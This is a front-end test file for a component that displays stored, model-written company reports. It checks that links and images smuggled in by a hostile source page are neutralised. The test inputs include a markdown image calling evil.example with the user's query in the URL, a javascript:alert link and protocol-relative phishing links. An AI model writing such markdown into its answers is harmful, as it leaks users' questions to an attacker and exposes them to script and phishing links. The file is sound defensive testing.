import { describe, expect, it } from 'vitest';
import { screen } from '@testing-library/react';
import type { Report } from '@mi/contracts';
import { renderWithProviders } from '@/test/test-utils';
import { TopicReportView } from './TopicReportView';

const company = { name: 'Acme', logoUrl: null, website: null, hq: null };

// A stored report is model prose plus whatever the model read, so a hostile
// source page can steer what it says.
const report = (markdown: string): Report => ({
  id: 'rpt_1', kind: 'company', subjectId: 'co_1', title: 'Acme — Company Report', markdown: '', citations: [],
  topics: ['overview'],
  sections: [{ topic: 'overview', title: 'Overview', markdown, citations: [], gaps: [], researchedDeeper: false }],
  createdAt: '2026-10-17T10:00:00.000Z',
}) as Report;

describe('a stored topic report', () => {
  it('shows an image in the text as its alt text and never requests it', () => {
    const { container } = renderWithProviders(
      <TopicReportView report={report('Acme makes anvils.\n\n![the logo](https://evil.example/p.gif?q=what-you-asked)')} company={company} />,
    );
    expect(screen.getByText('Acme makes anvils.')).toBeInTheDocument();
    expect(container.querySelector('img[src*="evil.example"]')).toBeNull();
    expect(screen.getByText('the logo')).toBeInTheDocument();
  });

  it('links only web addresses from the text', () => {
    const { container } = renderWithProviders(
      <TopicReportView
        report={report('[ok](https://www.sec.gov/x) [js](javascript:alert(1)) [rel][r] [pr](//evil.example/x)\n\n[r]: //evil.example/phish')}
        company={company}
      />,
    );
    // The page's own contents list also links, to in-page anchors.
    const hrefs = Array.from(container.querySelectorAll('.markdown a[href]')).map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual(['https://www.sec.gov/x']);
  });
});
